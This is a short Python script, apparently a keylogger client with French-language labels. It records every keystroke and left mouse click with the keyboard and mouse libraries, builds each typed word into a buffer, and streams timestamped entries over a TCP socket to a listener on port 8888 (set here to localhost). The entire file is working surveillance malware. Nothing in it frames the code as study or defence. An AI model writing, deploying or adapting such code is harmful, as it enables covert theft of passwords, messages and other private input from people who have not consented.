import socket
import time
import keyboard
import mouse
from datetime import datetime

def main():
    server_ip = '127.0.0.1'
    port = 8888
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((server_ip, port))

    buffer = ""

    while True:
        try:
            key = keyboard.read_event(suppress=False)

            if key.event_type == keyboard.KEY_DOWN:
                key_name = key.name
                if key_name == "space":
                    buffer += " "
                    key_name = "[ESPACE]"
                    send_message(client_socket, buffer, key_name)
                    buffer = ""
                elif key_name == "enter":
                    key_name = "[ENTRER]"
                    send_message(client_socket, buffer, key_name)
                    buffer = ""
                else:
                    buffer += key_name

            if mouse.is_pressed(button='left'):
                key_name = "[CLIC GAUCHE]"
                send_message(client_socket, buffer, key_name)
                buffer = ""

        except KeyboardInterrupt:
            break

    client_socket.close()

def send_message(client_socket, buffer, key_name):
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    message = f"{timestamp} - {buffer} {key_name}"
    client_socket.sendall(message.encode('utf-8'))

if __name__ == "__main__":
    main()
